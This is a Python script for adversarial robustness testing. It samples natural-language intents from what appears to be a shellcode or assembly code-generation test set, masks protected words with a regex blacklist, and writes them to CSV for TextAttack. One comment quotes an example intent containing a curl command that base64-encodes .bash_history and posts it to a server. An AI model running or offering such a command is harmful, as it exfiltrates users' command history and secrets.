import csv
import argparse
import regex as re
import itertools
import random
import shutil

p = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)

p.add_argument("--input_txt_file", help="input .in file containing the testset's intents", default=None)
p.add_argument("--output_csv_file",help="output .csv file",default=None)
p.add_argument("--output_blacklist", help="output txt file containing blacklisted words and their position to use in 'convert_to_txt.py'", default=None)
p.add_argument("--lines_to_edit", help="number of lines to attack",default=100)

args = p.parse_args()

if not (args.input_txt_file or args.output_csv_file):
	raise ValueError("Must specify input and output files")

#write here the words you don't want TextAttack to modify
B = ['jump','label', 'address', 'location', 'value', 'flag', 'variable', 'memory','quad-bytes', 'bytes', 'byte','register\'s', 'register','result', 'bits', 'pointer', 'data', 'stack', 'operand', 'execve', 'syscall','system', 'call', 'word', 'dword', 'double', 'section', 'doubleword','routine', 'registers', 'shellcode', 'encoded', 'function', '4-byte', 'short', 'sign', 'syscall', 'system']

registers = ['eax', 'ebx', 'ecx', 'edx', 'esp', 'ebp', 'esi', 'edi', 'ah', 'ax', 'al', 'bh', 'bl', 'bx', 'ch', 'cl', 'cx', 'dh', 'dl', 'dx', 'sp', 'bp', 'si', 'di']
			
#the first pattern finds strings between ' ' ignoring escaped \', while the second one finds words like .data, _data, _data_label, loc_4010E5, but excludes words like byte_tbl+2 and ebp+arg_0, that is, it finds words which are not preceded by nor followed by any non-whitespace characters

pattern = r"(\'.*?\'(?<!(\\')))|(?<!\S)(\w*[\._]\w+)(?!\S)|(\[.*?\])|(\(.*?\))|(\".*?\")|" + '|'.join(r"\b{}\b[,.:!]?".format(c) for c in B)+'|' + '|'.join(r"(?<!\S){}(?!\S)".format(r) for r in registers) + r"|[\w]+(?= label)|[\w]+(?= function)|[\w]+(?= routine)"	#words preceding label/funtion/routine
blacklist = re.compile(pattern)

#in a situation like this: define msg as the byte string 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post' inner "'" have to be escaped like \'

input_txt = args.input_txt_file
output_csv = args.output_csv_file
blacklist_txt = args.output_blacklist
lines_to_edit = int(args.lines_to_edit)

matches = []
match_and_pos = []
new_lines = []
matches_per_row = []
matches_total = []

def check_if_first_match(new_list_of_words, word, previous_matches):				#get the correct index if there's the same match twice in a single intent
	for i, elem in enumerate(new_list_of_words):
		if elem==word:
			#print("elem: "+elem+" word: "+word)
			if str(i) not in previous_matches:
				return i

def find_word_position(string, word, previous_matches):						#find word's position (not start index) in a string	
	split_pattern = r"(\'.*?\'(?<!(\\')))|(\[.*?\])|(\(.*?\))|(\".*?\")"		
	new_list_of_words = []
	list_of_words = re.split(split_pattern, string)						#first, split the intents if there's something between ' ' or [] or ()
	list_of_words = [s for s in list_of_words if s] 					#remove empty elements
	for w in list_of_words:
		w.rstrip()									#remove whitespace due to previous string removal
		if not re.fullmatch(split_pattern, w):						#if there were no ' ' or []
			w = re.split(r" ", w)							#split each intent on whitespace
			w = [s for s in w if s]							#remove empty elements
			new_list_of_words.append(w)
		else: 
			new_list_of_words.append([w])						#else, if there are some words between ' ' or [], don't split
	new_list_of_words = [s for string in new_list_of_words for s in string]			#reduce double list to single list
	#print(new_list_of_words)
	pos = check_if_first_match(new_list_of_words, word, previous_matches)			#get word's index
	return str(pos)

def attack():
	with open(input_txt, 'r') as in_file:
		stripped = (line.strip() for line in in_file)
		lines = (line.split("\n") for line in stripped if line)
		for l in lines:
			matches_per_row = []
			for c in l:
				matches = []			##
				match_and_pos = []
				for match in re.finditer(blacklist, c):					#for each intent find blacklisted words and their position in the string
					matches.append(match.group())					#append each matched word to a list in order to remove them from the string later
					#print ("single match " + str(match.group()))
					match_and_pos.append(find_word_position(c,match.group(), match_and_pos))#store word's position
					match_and_pos.append(match.group())				#store word
				matches_per_row.append(match_and_pos)					#store all the matches for a single intent 
				new_c=c+' '
				new_cp=new_c
				for m in matches:
					new_c = new_c.replace(" "+m, "")				#first, delete matches from string with space before
					if new_c.split(' ',1)[0] == m:					#then, delete match if it's the first word
						new_c = new_c.split(' ',1)[1]				#prevents situations like equal->equ due to al register
				new_lines.append(new_c)							#store stripped line to then write to output file
			matches_total.append(matches_per_row)						#store every match from every row
			#print ("matches per row " + str(matches_per_row))
		lines_to_write = (line.split("',") for line in new_lines)				#must split like this, otherwise it also splits lines such as "eax, al," etc
		with open(output_csv, 'w',newline='') as out_file:
			writer = csv.writer(out_file)
			writer.writerow(('intent',''))
			writer.writerows(lines_to_write)

	with open(blacklist_txt,'w') as bl_file:
		writer = csv.writer(bl_file)
		for m in matches_total:									#write matches to file in order to insert them back later
			if m[0]:
				writer.writerow(m[0])							#if there's a match write it
			else:
				writer.writerow('#')							#else write # to keep the original number of lines in file
		bl_file.close()

	with open(blacklist_txt, 'r') as bl_file_r:
		filedata = bl_file_r.read()
		filedata = filedata.replace('"""', '"')
	with open(blacklist_txt, 'w') as bl_file_w:
		bl_file_w.write(filedata)
		print("Conversion to csv done!")
		
lines_to_edit = int(args.lines_to_edit)

orig_txt=input_txt+"_orig.in"

shutil.copy(input_txt, orig_txt)							#orig is original, unchanged file to use in the final step
											#input_txt is the file that will be modified
with open(orig_txt, 'r+') as in_file:
	all_lines = in_file.readlines()
	rand_indexes = random.sample(range(len(all_lines)), lines_to_edit)		#sample k lines to attack where k is given by lines_to_edit
	rand_indexes.sort()
	in_file.write(",".join(map(str, rand_indexes)))				#write list of modified indexes on file to use it later
	with open(input_txt, 'w') as temp_file:
		for i in rand_indexes:
			temp_file.write(all_lines[i])
		temp_file.close()
	attack()
	in_file.close()	
